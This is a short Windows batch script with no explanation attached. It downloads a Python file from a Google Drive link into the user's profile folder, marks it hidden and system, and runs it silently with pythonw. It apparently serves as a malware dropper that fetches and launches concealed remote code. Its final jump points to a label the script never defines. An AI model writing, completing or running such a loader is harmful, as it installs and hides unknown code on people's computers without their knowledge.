@echo off


:hote
IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyw" (
	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
	goto rewind_1
) ELSE (
	curl -L -o "C:\Users\%USERNAME%\configuration\wxappx.pyw" "https://drive.usercontent.google.com/download?id=1BWI_g0rYHTo2byBmz1ASoc6a3aH9tLSl&export=download&authuser=0&confirm=t&uuid=68837b1c-e076-4f9e-bfb0-764fb92212f6&at=AIrpjvMjI7TtfYSOANWXDDcgxurH:1736532294502"
	attrib +s +h "C:\Users\%USERNAME%\configuration\wxappx.pyw"
	start "" pythonw "C:\Users\%USERNAME%\configuration\wxappx.pyw"
	goto rewind_1
)

